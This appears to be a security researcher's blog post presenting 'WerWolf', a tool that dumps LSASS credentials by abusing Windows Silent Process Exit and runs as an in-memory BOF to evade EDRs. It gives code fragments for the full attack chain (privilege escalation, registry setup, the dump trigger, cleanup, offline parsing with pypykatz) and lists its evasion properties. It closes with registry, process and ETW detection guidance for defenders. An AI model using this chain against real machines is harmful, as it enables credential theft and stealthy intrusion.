WerWolf: Taking Silent Process Exit from PowerShell Script to In-Memory BOF, and Why EDRs Still Can't See It

TL;DR

In 2022, Asaf Gilboa presented "LSASS Shtinkering" at DEF CON 30, introducing the world to abusing Windows Error Reporting's Silent Process Exit mechanism for LSASS credential dumping. Deep Instinct released a C tool. Compass Security followed with a PowerShell script. Both work. Both also drop artifacts to disk that modern EDRs have since learned to flag.

WerWolf takes the same core technique, RtlReportSilentProcessExit, and wraps it in something neither of those implementations considered: a custom Python COFF loader that executes the entire attack as an in-memory Beacon Object File. No executable on disk. No PowerShell logging. No script block telemetry. The BOF is parsed from raw COFF, mapped into memory via VirtualAlloc, relocated, and executed, all within the Python interpreter's process space.

This article walks through my research journey, what I built on top of the existing work, why the delivery mechanism matters as much as the technique itself, and what defenders should watch for now.

Credit Where It's Due

Before diving in, I want to be clear about the lineage of this technique:

  • Asaf Gilboa (Deep Instinct) presented the foundational research at DEF CON 30, "LSASS Shtinkering: Abusing Windows Error Reporting to Dump LSASS." His work uncovered how RtlReportSilentProcessExit could be abused to trigger WER-based LSASS dumps. This is the original discovery.
  • Deep Instinct released LsassSilentProcessExit, a compiled C tool that implements the technique.
  • Compass Security released PowerLsassSilentProcessExit, a PowerShell implementation.
  • Sigma detection rules now exist for the registry indicators this technique leaves behind.

WerWolf doesn't claim to invent the Silent Process Exit technique. What it does is solve the delivery problem, specifically how to execute this technique without the artifacts that the existing tools create.

How I Got Here: The Research Story

I was deep into LSASS credential dumping research, building and testing various approaches. I had already implemented several variants: the classic PssCaptureSnapshot + MiniDumpWriteDump approach, handle duplication via NtQuerySystemInformation, even a manual minidump writer that constructs the dump file format byte-by-byte without ever loading dbghelp.dll.

Each one was an incremental improvement. Each one evaded some EDRs. And each one eventually got caught.

The pattern was always the same: no matter how creative the approach, at some point my process had to read LSASS memory. Whether through a direct handle, a cloned snapshot, or a stolen handle from a donor process, eventually there was a NtReadVirtualMemory call with my PID as the source. And that's where EDRs were converging.

Finding Silent Process Exit

One night I was going through NTDLL exports in IDA, scrolling through the Rtl* function family, building a mental catalog of undocumented functions. I spotted RtlReportSilentProcessExit and started digging.

My first thought was that I had discovered something new. A few hours of research quickly corrected that: Gilboa's DEF CON 30 talk had already covered this ground thoroughly. Deep Instinct had released a tool. The technique was known.

But as I studied the existing implementations, I noticed something: they all had a delivery problem.

The Gap in Existing Tools

Deep Instinct's tool is a compiled C executable. You drop it to disk, run it, it does the job. But dropping an unsigned executable to disk in 2024+ is basically handing the EDR a gift wrapped detection. The binary gets scanned, flagged, quarantined.

Compass Security's tool is a PowerShell script. Better, no compiled binary. But PowerShell has become one of the most surveilled execution environments in enterprise security. Script Block Logging, AMSI, Constrained Language Mode, module logging, every major EDR has deep PowerShell visibility. Running a credential dump technique through PowerShell is like whispering a secret into a megaphone.

The core technique, RtlReportSilentProcessExit triggering a WER dump, is solid. The problem was getting it to execute without the delivery mechanism itself becoming the detection vector.

That's when I decided to build WerWolf: same technique, completely different delivery.

The Core Technique (Quick Recap)

For those unfamiliar with Silent Process Exit abuse, here's the short version. Full credit to Gilboa's original research for uncovering this.

RtlReportSilentProcessExit is an undocumented function in ntdll.dll:

NTSTATUS RtlReportSilentProcessExit(HANDLE ProcessHandle, NTSTATUS ExitStatus);

It's part of Windows' Silent Process Exit monitoring, a diagnostic feature since Windows 7. When called, it sends an ALPC message to the WER service, which spawns WerFault.exe to create a dump of the target process. The key insight: WerFault opens its own handle and reads the target's memory using its own trusted context.

The setup requires two registry configurations:

HKLM\...\Image File Execution Options\lsass.exe
    GlobalFlag = 0x200  (FLG_MONITOR_SILENT_PROCESS_EXIT)

HKLM\...\SilentProcessExit\lsass.exe
    ReportingMode  = 0x2  (LOCAL_DUMP)
    LocalDumpFolder = C:\Windows\Temp
    DumpType = 0x2  (MiniDumpWithFullMemory)

Then a single call:

RtlReportSilentProcessExit(hLsass, 0);

WerFault does the rest. Your process never reads LSASS memory.

What WerWolf Does Differently: The In-Memory BOF Loader

WerWolf's contribution isn't the dump technique, it's the execution model. The entire attack runs as a Beacon Object File (BOF) loaded and executed in memory by a custom Python COFF loader. No executable on disk, no PowerShell, no script telemetry.

What Is a BOF?

A BOF (Beacon Object File) is a raw COFF object file, the .o file a compiler produces before linking. It's position-independent machine code with unresolved symbol references. The concept was popularized by Cobalt Strike 4.1: instead of dropping a full executable, you send a tiny object file to the beacon, which loads it into memory, resolves its imports, and runs it.

WerWolf implements the same concept as a standalone Python tool, no Cobalt Strike required.

How the COFF Loader Works

The loader (loader.py) does what the Windows PE loader and linker do, but at runtime, in userspace:

1. Parse the COFF: The parser (parser.py) reads the raw .o file and extracts the file header, section headers, symbol table, string table, and relocations.

2. Allocate memory: One contiguous VirtualAlloc block holds everything: code sections, data sections, an import function pointer table, and internal stubs. Everything in one block guarantees REL32 relocations (32-bit signed displacement) won't overflow.

VirtualAlloc'd Block:
+-------------------------+  base
|  .text section          |  Machine code (4KB aligned)
+-------------------------+
|  .data section          |  Global variables
+-------------------------+
|  .rdata section         |  String constants
+-------------------------+
|  Import Function Table  |  8-byte pointer slots
|  [0] -> kernel32!Func1  |
|  [1] -> ntdll!Func2     |
|  [2] -> BeaconOutput cb |
+-------------------------+
|  Internal Stubs         |  ___chkstk_ms -> RET
+-------------------------+

3. Resolve symbols: BOFs declare Windows API imports using a MODULE$FUNCTION naming convention:

DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$RtlReportSilentProcessExit(HANDLE, NTSTATUS);

The compiler generates __imp_NTDLL$RtlReportSilentProcessExit. The loader strips __imp_, splits on $, calls LoadLibraryA + GetProcAddress, and writes the function pointer into the import table.

4. Apply relocations: The loader handles all AMD64 relocation types: REL32 (the workhorse for call/jmp), ADDR64, ADDR32NB, SECREL, and the REL32_1 through REL32_5 variants.

5. Execute: The loader finds the go entry point symbol and calls it via ctypes.CFUNCTYPE. The BOF runs as native code inside the Python process.

The Full Attack Chain

Step 1: SeDebugPrivilege

Single NTDLL call instead of the noisy three-call token chain:

NTDLL$RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE, &wasEnabled);

Step 2: Find LSASS

Standard CreateToolhelp32Snapshot enumeration to locate lsass.exe PID.

Step 3: Configure Silent Process Exit

// Image File Execution Options, enable monitoring
ADVAPI32$RegSetValueExA(hKey,
    "GlobalFlag", 0, REG_DWORD, &0x200, sizeof(DWORD));

// SilentProcessExit, configure local dump
ADVAPI32$RegSetValueExA(hSilentKey,
    "ReportingMode", 0, REG_DWORD, &0x2, sizeof(DWORD));
ADVAPI32$RegSetValueExA(hSilentKey,
    "DumpType", 0, REG_DWORD, &0x2, sizeof(DWORD));
ADVAPI32$RegSetValueExA(hSilentKey,
    "LocalDumpFolder", 0, REG_SZ, "C:\\Windows\\Temp", ...);

Step 4: Trigger the Dump

// Minimal handle, no VM_READ needed
HANDLE hLsass = NtOpenProcess(lsassPid, PROCESS_QUERY_LIMITED_INFORMATION, ...);

// One call, WER does everything else
NTDLL$RtlReportSilentProcessExit(hLsass, 0);

WerFault.exe spawns, opens LSASS with its own handle, reads memory, writes the dump. Our process never touches LSASS memory.

Step 5: Cleanup

ADVAPI32$RegDeleteKeyA(hIFEO, "lsass.exe\\SilentProcessExit");
ADVAPI32$RegDeleteValueA(hKey, "GlobalFlag");

Step 6: Parse Offline

pypykatz lsa minidump C:\Windows\Temp\lsass.exe_*.dmp

The Evasion Stack

WerWolf's evasion works on two layers: the technique layer (inherited from Gilboa's research) and the delivery layer (new with WerWolf).

Technique Layer (Silent Process Exit)

  • No direct LSASS memory read, WerFault reads it, not us
  • No MiniDumpWriteDump, WER uses its own internal mechanism
  • Minimal LSASS handle, only PROCESS_QUERY_LIMITED_INFORMATION
  • Trusted dump source, WerFault.exe is signed by Microsoft, whitelisted by EDRs
  • Broken behavioral chain, the sensitive operations happen in WerFault's context

Delivery Layer (In-Memory BOF)

  • No executable on disk, the COFF object is loaded directly into memory
  • No PowerShell, avoids Script Block Logging, AMSI, CLM
  • No recognizable PE structure, raw COFF sections, not a PE file with headers
  • Python process context, python.exe is common in enterprise environments, less suspicious than custom binaries
  • Single-use memory, the VirtualAlloc block is freed after execution, minimal forensic window

The existing Sigma rules for Silent Process Exit (registry_event_silentprocessexit_lsass) will still catch the registry modifications. That detection is solid and WerWolf doesn't bypass it. But the rules that target the delivery mechanism, scanning for the Deep Instinct binary or PowerShell script block patterns, those miss WerWolf entirely.

Detection Guidance (For the Blue Team)

The strongest detections for this technique class target the technique itself, not the delivery mechanism. These work regardless of whether the attacker uses the Deep Instinct tool, the PowerShell script, or WerWolf:

Registry Monitoring (Highest Signal)

  1. Watch Image File Execution Options\lsass.exe where GlobalFlag is being set to 0x200. This is a strong indicator. Legitimate use for LSASS is virtually nonexistent.
  2. Watch SilentProcessExit\lsass.exe as this key being created at all should trigger an alert.

Process Monitoring

  1. Correlate WerFault.exe spawns with LSASS. WerFault launching with LSASS as the target, when LSASS hasn't crashed, is anomalous.
  2. ETW tracing on RtlReportSilentProcessExit. Any call to this function targeting LSASS is suspicious.

File System

  1. Monitor WER output directories for unexpected .dmp files in C:\Windows\Temp or configured dump folders.

WerWolf-Specific (Delivery Layer)

  1. VirtualAlloc with PAGE_EXECUTE_READWRITE from python.exe, followed by LoadLibrary/GetProcAddress patterns. This is unusual for legitimate Python applications.
  2. Python process opening handles to LSASS, even PROCESS_QUERY_LIMITED_INFORMATION from python.exe is worth investigating.

Conclusion

The Silent Process Exit technique that Gilboa introduced at DEF CON 30 remains one of the most elegant LSASS dumping approaches available. It delegates the entire dump operation to a trusted Microsoft binary, breaking the behavioral detection chain that EDRs rely on.

But the existing implementations of this technique, a compiled C executable and a PowerShell script, create their own detection surface. They solve the "how to dump LSASS" problem while leaving the "how to deliver the code" problem wide open.

WerWolf closes that gap. By executing the technique as a BOF loaded through a custom Python COFF loader, it eliminates the disk artifacts, script logging, and binary signatures that defenders have built rules around. The technique stays the same. The delivery becomes invisible.

The broader lesson here isn't about one specific tool or technique. It's about the arms race between technique and delivery. The security industry gets good at detecting a technique, so attackers change how they deliver it. Detection rules built around specific implementations age out. Detection rules built around the underlying behavior, the registry keys, the WerFault correlation, the ETW signals, those are the ones that last.

Build your detections around what the technique does, not how it arrives.
